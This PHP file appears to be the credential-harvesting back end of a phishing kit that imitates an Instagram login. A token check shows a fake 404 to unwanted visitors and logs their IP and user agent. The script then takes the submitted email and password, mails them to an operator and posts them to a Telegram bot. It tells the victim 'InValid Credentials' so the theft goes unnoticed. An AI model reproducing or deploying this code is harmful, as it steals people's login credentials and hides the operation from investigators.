<?php
    session_start();
    require_once '../Vendor/Modernized.php';
    require_once '../Vendor/Pullers.php';
    require_once '../Vendor/Laravel.php';
    require_once '../conf.php';

    $Modernizeds = new Modernized;
    $Pullers = new Pullers;

    if (!$Modernizeds->checkToken()) {
        echo $Pullers->throw404();
        $Modernizeds->log(
            "../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $Modernizeds->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

$email = trim($_POST['ai']);
$password = trim(base64_decode($_POST['pr']));
if($email != null && $password != null){
	$det = trim($_POST['det']);

	$message .= "|".$det." Insta Quani|\n";
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .=  $Modernizeds->userDetails();


	$subject = "Login : $ip";
    mail($send, $subject, $message);   
 	$data = ['text' => $message,'chat_id' => $cID];    
	$website="https://api.telegram.org/bot$TGBO";
	  $ch = curl_init($website . '/sendMessage');
	  curl_setopt($ch, CURLOPT_HEADER, false);
	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	  curl_setopt($ch, CURLOPT_POST, 1);
	  curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	  $result = curl_exec($ch);
	  curl_close($ch);

	

	$signal = 'ok';
	$msg = 'InValid Credentials';
	

}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>